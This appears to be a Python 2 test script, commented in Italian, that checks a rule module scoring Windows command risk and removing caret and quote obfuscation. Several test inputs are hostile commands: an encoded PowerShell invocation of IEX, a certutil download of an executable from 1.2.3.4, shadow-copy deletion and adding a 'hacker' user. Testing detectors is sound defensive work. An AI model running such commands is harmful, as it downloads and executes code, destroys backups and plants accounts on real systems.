# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# I comandi offuscati con ^ o "" in mezzo alle parole (tc_regole.senza_offuscamento).
import tc_regole as R
b64 = u'JABjAD0AJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIA' + u'LgBkAGwAbAAiACkAXQAnADsASQBFAFgAIAAkAGMA'
casi = [
 (u'cmd /c p^o^w^e^r^s^h^e^l^l -enc ' + b64, 3),
 (u'cmd /v:on /c "set a=power&&set b=shell&&!a!!b! -enc ' + b64 + u'"', 3),
 (u'cmd /c pow""ersh""ell -e^nc ' + b64, 3),
 (u'cmd.exe /c v^s^s^a^d^m^i^n delete shadows /all /quiet', 2),
 (u'cmd /c findstr /r "^Errore" C:\\Logs\\app.log', 0),
 (u'cmd /c findstr /r /c:"^Error" /c:"^Warn" C:\\Logs\\app.log', 0),
 (u'cmd /c echo a ^& b ^| c ^> d', 0),
 (u'cmd /c tool.exe -e ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd', 0),
 (u'cmd /c myprog.exe -e SomeVeryLongArgumentValueWithoutSpaces123', 0),
 (u'cmd /c "C:\\Program Files\\App\\app.exe" --csv "a""b""c"', 0),
 (u'cmd /c set /a x=2^10', 0),
 (u'cmd /c c^e^r^t^u^t^i^l -urlcache -split -f http://1.2.3.4/a.exe C:\\Users\\Public\\a.exe', 3),
 (u'cmd /c n^e^t user hacker P@ss /add', 2),
 (u'cmd /c w^m^i^c shadowcopy delete', 2),
]
sb = 0
for r, atteso in casi:
    g = R.valuta_comando(r)
    noti = R.comandi_noti(r)
    livello = max([g.livello] + [p for p, f, c in noti])
    ok = livello == atteso
    if not ok: sb += 1
    print ('ok ' if ok else 'NO '), g.livello, [p for p, f, c in noti], g.certo, repr(r[:60]), '|', g.motivo().encode('utf-8')[:140], '|', g.decodificato[:40].encode('utf-8')
print 'sbagliati', sb
print R.senza_offuscamento(u'p^o^w^e^r^s^h^e^l^l'), R.senza_offuscamento(u'findstr "^a"'), R.senza_offuscamento(None), R.senza_offuscamento(u'')
